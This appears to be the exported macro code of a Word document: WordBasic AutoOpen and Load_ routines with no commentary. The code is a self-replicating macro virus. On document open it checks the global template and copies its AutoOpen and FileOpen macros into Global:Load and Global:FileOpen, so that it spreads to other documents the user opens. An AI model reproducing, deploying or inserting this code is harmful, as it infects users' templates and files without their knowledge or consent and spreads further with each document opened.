   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim how_many
   Dim i
   Dim loaded
   Dim new_$
   Dim macr_new$
   how_many = WordBasic.CountMacros(0, 0)
   For i = 1 To how_many
       Select Case WordBasic.[MacroName$](i, 0, 0)
       Case "FileOpen"
           loaded = -1
       Case "Load"
           loaded = -1
       Case Else
       End Select
   Next i
   If Not loaded Then
       new_$ = WordBasic.[FileName$]()
       macr_new$ = new_$ + ":AutoOpen"
       WordBasic.MacroCopy macr_new$, "Global:Load"
       macr_new$ = new_$ + ":FileOpen"
       WordBasic.MacroCopy macr_new$, "Global:FileOpen"
   End If

   End Sub

   Attribute VB_Name = "Load_"

   Public Sub MAIN()
   Dim how_many
   Dim i
   Dim loaded
   Dim new_$
   Dim macr_new$
   how_many = WordBasic.CountMacros(0, 0)
   For i = 1 To how_many
       Select Case WordBasic.[MacroName$](i, 0, 0)
       Case "FileOpen"
           loaded = -1
       Case "Load"
           loaded = -1
       Case Else
       End Select
   Next i
   If Not loaded Then
       new_$ = WordBasic.[FileName$]()
       macr_new$ = new_$ + ":AutoOpen"
       WordBasic.MacroCopy macr_new$, "Global:Load"
       macr_new$ = new_$ + ":FileOpen"
       WordBasic.MacroCopy macr_new$, "Global:FileOpen"
   End If

   End Sub
